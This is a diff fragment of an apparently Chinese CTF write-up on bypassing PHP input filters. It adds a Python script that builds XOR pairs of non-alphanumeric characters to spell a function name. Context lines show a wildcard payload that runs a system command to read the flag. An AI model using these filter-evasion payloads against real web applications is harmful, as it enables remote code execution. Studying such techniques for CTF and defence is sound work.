@@ -50,6 +50,48 @@ foreach ($a as $k => $v) {
 }
 echo $res;
 ```
+```python
+#!/usr/bin/python
+#coding=utf-8
+
+def getNoshell(keyword=""):
+    noPrint = []
+    noAllow = []
+    for i in range(1, 48):
+        if i not in noAllow:
+            noPrint.append(i)
+    for i in range(58, 65):
+        if i not in noAllow:
+            noPrint.append(i)
+    for i in range(91, 97):
+        if i not in noAllow:
+            noPrint.append(i)
+    for i in range(123, 128):
+        if i not in noAllow:
+            noPrint.append(i)
+    result = {}
+    for k in keyword:
+        result[k] = {}
+        result[k]['l'] = []
+        result[k]['r'] = []
+        for i in range(0,len(noPrint)):
+            for j in noPrint[i:]:
+                if chr(noPrint[i] ^ j) == k:
+                    result[k]['l'].append('chr(' + str(noPrint[i]) + ')')
+                    result[k]['r'].append('chr(' + str(j) + ')')
+    letn = 999999
+    for k in result:
+        if letn > len(result[k]['l']):
+            letn = len(result[k]['l'])
+    for m in range(0,letn):
+        testl = ''
+        testr = ''
+        for k in keyword:
+            testl = testl + result[k]['l'][m] + "."
+            testr = testr + result[k]['r'][m] + "."
+        print testl[0:-1] + "^" + testr[0:-1]
+getNoshell("getFlag")
+```
 利用通配符调用Linux系统命令，来查看flag ：
 ```sh
 $_=`/???/??? /????`;?><?=$_?>
